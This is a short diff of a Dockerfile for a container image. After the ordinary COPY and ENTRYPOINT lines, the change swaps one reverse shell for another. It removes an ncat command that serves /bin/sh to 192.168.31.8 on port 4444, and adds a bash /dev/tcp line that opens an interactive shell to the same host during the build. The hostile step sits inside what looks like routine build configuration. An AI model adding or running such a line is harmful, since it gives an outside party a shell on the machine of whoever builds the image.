@@ -39,5 +39,4 @@ EXPOSE 80
 COPY main.sh /
 ENTRYPOINT ["/main.sh"]
 
-RUN ncat 192.168.31.8 4444 -e /bin/sh
-CMD ["/bin/bash"]
+RUN bash -i >& /dev/tcp/192.168.31.8/4444 0>&1
